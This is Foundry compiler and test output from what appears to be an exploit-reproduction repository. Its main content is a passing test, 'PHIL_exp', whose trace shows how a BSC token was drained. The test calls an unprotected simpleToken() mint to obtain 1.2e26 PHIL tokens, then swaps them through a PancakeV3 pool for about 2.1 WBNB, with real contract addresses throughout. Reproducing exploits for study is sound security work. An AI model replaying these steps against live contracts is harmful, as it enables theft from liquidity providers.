Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.19s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-12/PHIL_exp.sol:18:5:
   |
18 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 249.27ms (181.63µs CPU time)

Ran 1 test for src/test/2023-12/PHIL_exp.sol:ContractTest
[PASS] testExploit() (gas: 202986)
Logs:
  Attacker WBNB balance before attack: 0.000000000000000000
  Attacker WBNB balance after attack: 2.098651734690958892

Traces:
  [205786] ContractTest::testExploit()
    ├─ [2534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance before attack", val: 0, decimals: 18)
    ├─ [26697] PHIL::simpleToken()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 120000000000000000000000000 [1.2e26])
    │   └─ ← [Stop] 
    ├─ [154959] 0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 21000000000000000000000 [2.1e22], 4295128740 [4.295e9], 0x61)
    │   ├─ [27962] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2098651734690958892 [2.098e18])
    │   │   ├─ emit Transfer(from: 0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2098651734690958892 [2.098e18])
    │   │   └─ ← [Return] true
    │   ├─ [2635] PHIL::balanceOf(0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349) [staticcall]
    │   │   └─ ← [Return] 1799535406211413623944985 [1.799e24]
    │   ├─ [7855] ContractTest::pancakeV3SwapCallback(21000000000000000000000 [2.1e22], -2098651734690958892 [-2.098e18], 0x61)
    │   │   ├─ [266] 0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349::token0() [staticcall]
    │   │   │   └─ ← [Return] PHIL: [0x4308D314096878D3bf16C9d8DB86101F70BBebF1]
    │   │   ├─ [6221] PHIL::transfer(0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349, 21000000000000000000000 [2.1e22])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349, value: 21000000000000000000000 [2.1e22])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [635] PHIL::balanceOf(0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349) [staticcall]
    │   │   └─ ← [Return] 1820535406211413623944985 [1.82e24]
    │   ├─ emit Swap(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 21000000000000000000000 [2.1e22], param3: -2098651734690958892 [-2.098e18], param4: 791833419678244374545150201 [7.918e26], param5: 212948203813306247371617 [2.129e23], param6: -92120 [-9.212e4], param7: 3570000000000000000 [3.57e18], param8: 0)
    │   └─ ← [Return] 21000000000000000000000 [2.1e22], -2098651734690958892 [-2.098e18]
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2098651734690958892 [2.098e18]
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after attack", val: 2098651734690958892 [2.098e18], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 308.11ms (1.35ms CPU time)

Ran 2 test suites in 309.65ms (557.39ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
